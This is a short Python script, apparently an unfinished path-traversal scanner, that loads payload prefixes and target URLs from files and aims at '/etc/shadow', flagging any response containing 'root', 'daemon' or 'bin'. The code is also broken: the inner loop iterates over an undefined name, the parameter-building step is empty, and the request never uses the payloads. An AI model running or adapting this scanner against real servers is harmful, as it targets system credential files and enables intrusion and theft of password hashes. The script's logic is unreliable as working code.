import re
import requests
import time

def main():

    f = open("Payloads", "r") # filename of Prefix
    prefixes = re.split("\n", str(f.read()))
    f.close()

    f = open("urls", "r") # filename of urls
    urls = re.split("\n", str(f.read()))
    f.close()

    suffixes = ["etc/shadow"] # suffix
    
    delay = 1 # time of delay between every request

    # for every url
    for url in urls:
        # for every prefix
        for prefix in prefixes:
            # for every suffix
            for suffix in suffix:

                # set params
                                

                # request
                try:
                
                    res = requests.get(url)
                    time.sleep(delay)
                    if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
                        print(url)
                
                except: pass
